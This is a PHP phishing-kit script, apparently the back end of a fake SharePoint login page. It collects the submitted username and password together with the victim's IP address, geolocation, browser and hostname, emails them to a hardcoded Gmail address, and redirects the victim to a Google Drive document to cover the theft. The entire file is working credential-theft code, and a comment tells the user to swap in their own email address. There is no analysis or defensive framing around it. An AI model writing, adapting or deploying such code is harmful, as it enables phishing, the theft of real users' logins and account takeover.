<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------ShareP Login-----------------------\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By rYan------------------------------\n";


$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY SVIBES-------------\n";
//change ur email here
$send = "deparmentcredits@gmail.com";
$subject = "Result from $ip";
$headers = "From: SMG<customer-support@ryan>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
 header("Location: https://drive.google.com/file/d/0BwQW_LHWYsi8RzFjeE1IZE9QNnc/edit");

	 
?>